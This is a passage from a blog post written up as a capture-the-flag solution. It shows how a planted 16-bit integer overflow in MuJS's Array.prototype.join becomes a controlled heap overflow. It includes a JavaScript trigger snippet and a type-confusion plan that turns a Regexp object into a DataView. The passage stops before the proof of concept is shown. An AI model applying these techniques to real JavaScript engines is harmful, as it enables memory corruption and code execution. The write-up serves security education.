@@ -1,0 +1,617 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>the pepsi place | Attacking MuJS: Breaking a JS engine with type confusion and an integer overflow.</title>
+  <meta name="description" content="Writeup to uiuctf's mujs challenge, a javascript pwn challenge were you must pwn the MuJS javascript engine to achieve arbitrary read, write, and code execution.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Attacking MuJS: Breaking a JS engine with type confusion and an integer overflow.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://blog.pepsipu.com/posts/mujs-uiuctf">
+  <meta property="og:description" content="Writeup to uiuctf's mujs challenge, a javascript pwn challenge were you must pwn the MuJS javascript engine to achieve arbitrary read, write, and code execution.">
+  <meta property="og:site_name" content="the pepsi place">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://blog.pepsipu.com/posts/mujs-uiuctf">
+  <meta name="twitter:title" content="Attacking MuJS: Breaking a JS engine with type confusion and an integer overflow.">
+  <meta name="twitter:description" content="Writeup to uiuctf's mujs challenge, a javascript pwn challenge were you must pwn the MuJS javascript engine to achieve arbitrary read, write, and code execution.">
+
+  
+    <meta property="og:image" content="https://blog.pepsipu.com/assets/og-image-04fbfc4e15efb2f7c4cde09b072db471162ce6a646dd0d04e1f19eec72491c9b.jpg">
+    <meta name="twitter:image" content="https://blog.pepsipu.com/assets/og-image-04fbfc4e15efb2f7c4cde09b072db471162ce6a646dd0d04e1f19eec72491c9b.jpg">
+  
+
+  <link href="https://blog.pepsipu.com/feed.xml" type="application/rss+xml" rel="alternate" title="the pepsi place Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-11327753546b2135c989eee5cd83497a2734b702928d016839d795f6c706e3d5.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="the pepsi place">the pepsi place</a>
+  <ul class="header-links">
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/pepsipu" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://instagram.com/sam.hajhamid" rel="noreferrer noopener" target="_blank" title="Instagram">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-instagram">
+  <use href="/assets/instagram-37f85bc75b43ecc4c114d9a46f846327fe13c5893787c6afbcfef9d30d58bd9e.svg#icon-instagram" xlink:href="/assets/instagram-37f85bc75b43ecc4c114d9a46f846327fe13c5893787c6afbcfef9d30d58bd9e.svg#icon-instagram"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:pepsipu@pepsipu.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
+  <use href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss" xlink:href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+  </ul>
+</nav>
+
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Attacking MuJS: Breaking a JS engine with type confusion and an integer overflow.</h1>
+            <p>Writeup to uiuctf's mujs challenge, a javascript pwn challenge were you must pwn the MuJS javascript engine to achieve arbitrary read, write, and code execution.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    July 18, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/ctf" title="See all posts with tag 'ctf'">ctf</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <h2 id="introduction">Introduction</h2>
+
+<p>This weekend, I played <a href="http://uiuc.tf/">uiuctf</a> with DiceGang. Although all of the pwn was splendid, one did really stick out to me, and that was mujs. mujs relied on <a href="https://mujs.com/">MuJS Javascript engine</a>, which I have never worked with before. Although I am very unfamiliar with javascript pwn, I must give props to Sam Sharps, the author of this challenge, for the the installations scripts and templates as well as the informative README.md which made this challenge a whole lot easier to setup and begin bug hunting.</p>
+
+<p>As a side note, thank you <a href="https://www.instagram.com/jiwuko/">jiwuko</a> for making the drawings in this writeup.</p>
+
+<h2 id="the-goal">The Goal</h2>
+
+<p>Usually, when doing a JS pwn challenge, you’ve got to somehow get a shell. But uiuctf wasn’t going to make it that easy! We had to implement 3 different primitives to get the flag. In addition, all 3 primitives needed to work across platforms.</p>
+
+<ul>
+  <li>read32, to read from any address</li>
+  <li>write32, to write to any address</li>
+  <li>execute, to execute any address</li>
+</ul>
+
+<p>Dang, this is looking like kind of a tall order. But that’s alright! We can tackle creating each primitive individually, each primitive building on the last. But, of course, if we want to have any hope of implementing these primitives, we are going to need to find the bug first.</p>
+
+<h2 id="the-bug">The Bug</h2>
+
+<p>Finding the bug was really really simple! The README.md told you that the bug was in a function called <code class="highlighter-rouge">Ap_join</code> in <code class="highlighter-rouge">jsarray.c</code>.  <code class="highlighter-rouge">Ap_join</code> is the function handler for <code class="highlighter-rouge">Array.prototype.join</code>. For reference, <code class="highlighter-rouge">.join</code> has the following result:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">bb</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ccc</span><span class="dl">'</span><span class="p">].</span><span class="nx">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">-</span><span class="dl">'</span><span class="p">)</span>
+<span class="c1">// a-bb-ccc</span>
+</code></pre></div></div>
+
+<p>The first thing I did was <code class="highlighter-rouge">git diff HEAD</code> to see what changes the authors made in this file. This way, the vulns would be a lot easier to find!</p>
+
+<p>But… there was only one change…?</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">--- a/jsarray.c
+</span><span class="gi">+++ b/jsarray.c
+</span><span class="p">@@ -1,6 +1,7 @@</span>
+ #include "jsi.h"
+ #include "jsvalue.h"
+ #include "jsbuiltin.h"
+<span class="gi">+#include &lt;stdint.h&gt;
+</span>
+ int js_getlength(js_State *J, int idx)
+ {
+<span class="p">@@ -91,8 +92,10 @@</span> static void Ap_join(js_State *J)
+        const char *sep;
+        const char *r;
+        int seplen;
+<span class="gd">-       int k, n, len;
+</span><span class="gi">+       uint16_t k, n, len; 
+</span></code></pre></div></div>
+
+<p>So, it seems that the variables <code class="highlighter-rouge">k</code>, <code class="highlighter-rouge">n</code>, and <code class="highlighter-rouge">len</code> have all been squished from 32 bits to 16 bits. It’s also unsigned, so this means these values can’t become negative no matter how large they get. This raises the question, “How does the change in the maximum capacity of these 3 variables lead to undefined behavior”? Well, in order to answer that question, let’s consider what we know about the maximum capacity of integers that might help us exploit the small capacity of these 16 bit integers.</p>
+
+<p><strong>When an integer tries to hold a value that is too big for it’s intended size, it’ll only store the amount of bits it was designed to hold from that value</strong>. For example, when reading a 64 bit integer, a 32 bit integer will only store the first 32 bits.</p>
+
+<p>This is known as an <strong>integer overflow</strong>. Remember this! It’ll serve us well. As a tiny demo, I want you to predict what will happen if we added one to a 16 bit integer holding the maximum value that can be represented by 16 bits.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint16_t</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xffff</span><span class="p">;</span>
+<span class="o">++</span><span class="n">a</span><span class="p">;</span>
+<span class="c1">// what will a equal?</span>
+</code></pre></div></div>
+
+<p>Go ahead! Try it. It’ll help you build an intuition for integer overflows.</p>
+
+<p>Now that you’ve tried, you’ll realize <code class="highlighter-rouge">a</code> will have dropped to 0. Why though? Well, let’s reason why by looking at the binary.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// a = 0b1111111111111111</span>
+<span class="kt">uint16_t</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xffff</span><span class="p">;</span>
+<span class="c1">// a = 0b10000000000000000</span>
+<span class="o">++</span><span class="n">a</span><span class="p">;</span>
+<span class="c1">// remember! a will only take the first 16 bits, which are all 0. so, a = 0.</span>
+</code></pre></div></div>
+
+<p>Going back to our <code class="highlighter-rouge">.join</code> code,  if we can find a place where a sudden drop in value due to an integer overflow would cause undefined behaviour, we could exploit that! So, let’s track variable usage of <code class="highlighter-rouge">k</code>, <code class="highlighter-rouge">n</code>, and <code class="highlighter-rouge">len</code> to see if we can cause any of these variables to overflow. This for loop is the most important code, which creates the string to be returned from <code class="highlighter-rouge">.join</code>. Please look over it carefully! I’ve added comments to make it more easy to understand.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// n is the current length of our result of the function. it starts off at 1 because an empty string has nothing except 1 null byte</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// get the kth element in the array we are joining</span>
+  <span class="n">js_getindex</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">k</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">js_isundefined</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">||</span> <span class="n">js_isnull</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+  <span class="k">else</span>
+    <span class="c1">// r = array[k].toString()</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">js_tostring</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="n">n</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>
+
+  <span class="c1">// if this is the first iteration, we don't want to add the seperator of join like usual</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">js_malloc</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">n</span> <span class="o">+=</span> <span class="n">seplen</span><span class="p">;</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">js_realloc</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">sep</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">js_pop</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Woah, that’s a lot of code! Don’t worry, we can break it down, piece by piece. First, let’s try to find out what each variable is used for. Clearly, <code class="highlighter-rouge">k</code> is used as the iterator counter, so overflowing it wouldn’t do much besides reset the loop. How about <code class="highlighter-rouge">len</code>? Well, <code class="highlighter-rouge">len</code> represents the length of the array we are calling. <code class="highlighter-rouge">len</code> is used as the upper bound of the loop, so making the array longer than the maximum value of a 16 bit unsigned integer would just cause the upper bound to shrink, which isn’t very helpful.</p>
+
+<p><code class="highlighter-rouge">n</code>, on the other hand, could be very useful. <code class="highlighter-rouge">n</code> represents the current length of the result of <code class="highlighter-rouge">.join</code>. I want you to really focus on the following code. For context, <code class="highlighter-rouge">r</code> is equal to the current element of the array we are joining.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">n</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">out</span> <span class="o">=</span> <span class="n">js_malloc</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="n">n</span> <span class="o">+=</span> <span class="n">seplen</span><span class="p">;</span>
+  <span class="n">out</span> <span class="o">=</span> <span class="n">js_realloc</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">sep</span><span class="p">);</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>These couple lines will be the holy grail of our exploit. But before I tell you why, I want you to try to see why an overflow in <code class="highlighter-rouge">n</code> will allow us to cause undefined behavior! As a clue, note that <code class="highlighter-rouge">r</code> can be made as long as we want, even longer than the maximum size of a 16 bit integer. For now, let’s just consider the code when <code class="highlighter-rouge">k</code>, the iterator counter, is 0. We will discuss the else case in a bit.</p>
+
+<p>Did you see it? That’s right! If and only if <code class="highlighter-rouge">n</code> overflows, there will be a discrepancy between the size of the data and the size of the allocation for the data. Didn’t get it? That’s alright, I didn’t spot it right away either. Either way, let’s consider what might happen if the length of <code class="highlighter-rouge">r</code> happens to cause <code class="highlighter-rouge">n</code> to overflow.</p>
+
+<p>First, let’s take a look at the first line. Here, we see that the string length of <code class="highlighter-rouge">r</code>, the current element that is being joined, is added to <code class="highlighter-rouge">n</code>. Notice that <code class="highlighter-rouge">strlen</code> returns a <code class="highlighter-rouge">size_t</code>! A <code class="highlighter-rouge">size_t</code> is as big as the size of the architecture, so it would be 32 bits on a 32 bit architecture and 64 bit on a 64 bit architecture. Unfortunately for the program, <code class="highlighter-rouge">n</code> is a 16 bit integer, so <code class="highlighter-rouge">n</code> will only take the first 16 bits of the result of <code class="highlighter-rouge">strlen</code>. The first 16 bits of the length of <code class="highlighter-rouge">r</code> is completely different than the length of <code class="highlighter-rouge">r</code>, but the first 16 bits is used as the allocation size! Now the bug is obvious. In case it isn’t, here’s an example.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// let's say r = 'A' * 0xffff</span>
+<span class="c1">// n starts off as 1</span>
+
+<span class="c1">// 1 + 0xffff is 0x10000!</span>
+<span class="c1">// n is a 16 bit integer, so it'll only read the first 16 bits, so n = 0.</span>
+<span class="n">n</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// we allocate 0 bytes to hold r </span>
+  <span class="n">out</span> <span class="o">=</span> <span class="n">js_malloc</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+  <span class="c1">// we copy r to an allocation sized for 0 bytes! that's the bug! that's a heap overflow!</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><img src="https://i.imgur.com/8fglQzT.png" alt="" /></p>
+
+<p><em><code class="highlighter-rouge">n</code> taking only the first 16 bits.</em></p>
+
+<p>Of course, this is an unrefined version of the bug. In an optimal case, we’d like this bug to allow us to choose two things:</p>
+
+<ul>
+  <li>We want to control exactly how many bytes will be allocated, so we can choose which region of the heap will be used to service this allocation (more on this later). Just know for now, if we want two objects in memory to be adjacent to one another, we need their size to be very similar if not the same. This’ll be important for choosing what objects we want to overflow in memory.</li>
+  <li>We also want to control exactly how much we will overflow by, so we can selectively change different values on the heap without changing ones we don’t want to change.</li>
+</ul>
+
+<p>So, how do we do both of these things? Well, if we only have one element in the array, it’s impossible. Before I tell you why it’s impossible, try to figure it out yourself. I’ll tell you why after you try it yourself.</p>
+
+<p>This is because the only time we will ever get a heap overflow is if the length of <code class="highlighter-rouge">r</code> overflows <code class="highlighter-rouge">n</code>. But in order to get this integer overflow, <code class="highlighter-rouge">r</code> needs to be the maximum size of a 16 bit integer so it overflows <code class="highlighter-rouge">n</code>, meaning if we want an overflow, we can’t really control the length of <code class="highlighter-rouge">r</code>. However, if we use two elements, we can do this.</p>
+
+<p>Found a solution? Instead of explaining this in words, I’ll let the code do the talking first.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">allocation_size</span> <span class="o">=</span> <span class="mh">0x8</span>
+<span class="kd">let</span> <span class="nx">overflow_content</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">OVERFLOWCONTENT!</span><span class="dl">'</span>
+<span class="p">[</span><span class="dl">'</span><span class="s1">A</span><span class="dl">'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x10000</span> <span class="o">-</span> <span class="p">(</span><span class="nx">overflow_content</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="nx">allocation_size</span><span class="p">)),</span> <span class="nx">overflow_content</span><span class="p">].</span><span class="nx">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Although this looks a little weird, i’ll make more sense if I show you the C that’s running the the background.</p>
+
+<p>For the first element:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// n will be 0xfff8, using our formula</span>
+<span class="n">n</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>
+<span class="c1">// k, iterator counter, will be 0 for the first element</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// allocate a chunk of 0xfff7 since n starts off as 1</span>
+  <span class="n">out</span> <span class="o">=</span> <span class="n">js_malloc</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+  <span class="c1">// safely copy r to this chunk</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>No bug exploitation for the first element, but that changes for the second element.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 0xfff8 + 16 = 0x10008, but n will take the first 16 bits so n = 8</span>
+<span class="n">n</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>
+
+<span class="c1">// k is not 0 so we go to else case</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">out</span> <span class="o">=</span> <span class="n">js_malloc</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="c1">// sep length is 0</span>
+  <span class="n">n</span> <span class="o">+=</span> <span class="n">seplen</span><span class="p">;</span>
+  <span class="c1">// realloc copies contents, so chunk is full</span>
+  <span class="n">out</span> <span class="o">=</span> <span class="n">js_realloc</span><span class="p">(</span><span class="n">J</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+  <span class="c1">// sep is our seperator, which is '', so no change</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">sep</span><span class="p">);</span>
+  <span class="c1">// append r to end of chunk</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Interesting, right? The program never expects the reallocation to be smaller than the previous allocation, so <code class="highlighter-rouge">strcat</code> will append to the end of the chunk. The trick to getting a user sized overflow is to make the size of <code class="highlighter-rouge">n</code> just big enough in the first element so that the second element actually causes the integer overflow. Now that we have our heap overflow, how can we abuse it to get any primitives?</p>
+
+<h2 id="type-confusion-101">Type Confusion 101</h2>
+
+<p>Me and my team tried several ideas to turn this heap overflow into primitives. We kept running into the issue that our exploit needed to be cross platform and preferably leakless. We tried assembling fake objects and attacking the custom allocator, but all of those required leaks. Then, we decided to look at what an object in MuJS is structured like in memory so we could possibly change important values with our heap overflow. That lead to us finding a javascript exploitation tactic know as “type confusion”.</p>
+
+<p>Now, before we actually get into type confusion, let’s look at the structure for an object in memory. It’ll let us know what we can change!</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">js_Object</span>
+<span class="p">{</span>
+	<span class="k">enum</span> <span class="n">js_Class</span> <span class="n">type</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">extensible</span><span class="p">;</span>
+	<span class="n">js_Property</span> <span class="o">*</span><span class="n">properties</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">count</span><span class="p">;</span> <span class="cm">/* number of properties, for array sparseness check */</span>
+	<span class="n">js_Object</span> <span class="o">*</span><span class="n">prototype</span><span class="p">;</span>
+	<span class="k">union</span> <span class="p">{</span>
+		<span class="kt">int</span> <span class="n">boolean</span><span class="p">;</span>
+		<span class="kt">double</span> <span class="n">number</span><span class="p">;</span>
+		<span class="k">struct</span> <span class="p">{</span>
+			<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">;</span>
+			<span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
+		<span class="p">}</span> <span class="n">s</span><span class="p">;</span>
+		<span class="k">struct</span> <span class="p">{</span>
+			<span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
+    <span class="p">...</span>
+    <span class="c1">// and several other possible structures of this union i've emitted for readability</span>
+    <span class="k">struct</span> <span class="p">{</span>
+      <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>
+    	<span class="kt">uint8_t</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span>
+  	<span class="p">}</span> <span class="n">dataview</span><span class="p">;</span>
+	<span class="p">}</span> <span class="n">u</span><span class="p">;</span>
+	<span class="n">js_Object</span> <span class="o">*</span><span class="n">gcnext</span><span class="p">;</span> <span class="cm">/* allocation list */</span>
+	<span class="n">js_Object</span> <span class="o">*</span><span class="n">gcroot</span><span class="p">;</span> <span class="cm">/* scan list */</span>
+	<span class="kt">int</span> <span class="n">gcmark</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Our heap overflow can’t contain null bytes, since Javascript doesn’t allow null bytes in strings. This effectively prevents us from changing anything that’s not the first member of this structure. But that’s alright! The first member is something called <code class="highlighter-rouge">type</code> and is a variant of an enum.. maybe we can change that?</p>
+
+<p>Taking a look at the <code class="highlighter-rouge">js_Class</code> enum, it becomes clear what exactly this <code class="highlighter-rouge">type</code> variable does. Take a look for yourself.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="n">js_Class</span> <span class="p">{</span>
+	<span class="n">JS_COBJECT</span><span class="p">,</span>
+	<span class="n">JS_CARRAY</span><span class="p">,</span>
+	<span class="n">JS_CFUNCTION</span><span class="p">,</span>
+	<span class="n">JS_CSCRIPT</span><span class="p">,</span> <span class="cm">/* function created from global code */</span>
+	<span class="n">JS_CEVAL</span><span class="p">,</span> <span class="cm">/* function created from eval code */</span>
+	<span class="n">JS_CCFUNCTION</span><span class="p">,</span> <span class="cm">/* built-in function */</span>
+	<span class="n">JS_CERROR</span><span class="p">,</span>
+	<span class="n">JS_CBOOLEAN</span><span class="p">,</span>
+	<span class="n">JS_CNUMBER</span><span class="p">,</span>
+	<span class="n">JS_CSTRING</span><span class="p">,</span>
+	<span class="n">JS_CREGEXP</span><span class="p">,</span>
+	<span class="n">JS_CDATE</span><span class="p">,</span>
+	<span class="n">JS_CMATH</span><span class="p">,</span>
+	<span class="n">JS_CJSON</span><span class="p">,</span>
+	<span class="n">JS_CARGUMENTS</span><span class="p">,</span>
+	<span class="n">JS_CITERATOR</span><span class="p">,</span>
+	<span class="n">JS_CUSERDATA</span><span class="p">,</span>
+	<span class="n">JS_CDATAVIEW</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Everything in MuJS that isn’t a primitive data type is a <code class="highlighter-rouge">js_Object</code>! And this type variable tells the program exactly what type of object it is. This gave me many ideas.</p>
+
+<p>Taking a couple of notes here, there seems to be an union called <code class="highlighter-rouge">u</code> in <code class="highlighter-rouge">js_Object</code>. I encourage you to check out the source code yourself to see the full defintion of this union, but if you can’t, that’s fine. This <code class="highlighter-rouge">u</code> union seems to contain the type specific data for the object. For example, a string, this union will contain a pointer to the string and the length of the string, but if this object were a function, it would contain a pointer to the function and the name of the function. Keep in mind all members of a union will occupy the same space in memory, so if we managed to change the type of the object, data in the union would be treated differently than intended.</p>
+
+<p>For example, what would happen if a string suddenly changed into a function? Well, the address for the string would be interepreted as a pointer to a function. Likewise, if a function suddenly became a string, the pointer to the function would be interpreted as a string. As you can see, this could be very powerful.</p>
+
+<p>For my exploit, I decided to change a Regexp object into a DataView object. Before I discuss why I chose these two objects specifcally, let me show you what a Regexp and DataView object is.</p>
+
+<p>A Regexp object is just a regular expression in Javascript. It need not any introductions, but you should know it’s memory structure since it’ll be useful when we change it to a DataView.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">js_Regexp</span>
+<span class="p">{</span>
+	<span class="kt">void</span> <span class="o">*</span><span class="n">prog</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">source</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">flags</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">last</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>The relevant property here is the <code class="highlighter-rouge">source</code>. <code class="highlighter-rouge">source</code> is the regular expression string, which we can control. The fact we can control it is very useful, so keep that in mind.</p>
+
+<p>Now let’s look at DataView. DataView was added by the author and essentially is a C array but for Javascript.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="p">{</span>
+  <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>
+  <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">dataview</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The length denotes the length of the C-like array and data is a pointer to the array. If a Regexp suddenly became a DataView, how would it’s data in the union, like <code class="highlighter-rouge">source</code> and <code class="highlighter-rouge">prog</code>, be interpreted as a DataView? Think about it.</p>
+
+<p>Well, since this is a union, <code class="highlighter-rouge">prog</code> would go where <code class="highlighter-rouge">length</code> is, and <code class="highlighter-rouge">source</code> would go where <code class="highlighter-rouge">data</code> is. <code class="highlighter-rouge">prog</code> is just some pointer, but if it were interpreted as the length of an array, then the length of the array would be absolutely massive! And remember that <code class="highlighter-rouge">source</code> is a pointer to a user controlled string, so we can essentially treat this string like a super long array if the Regexp became a DataView!</p>
+
+<p>As a proof of concept, let’s try writing out of bounds.</p>
+
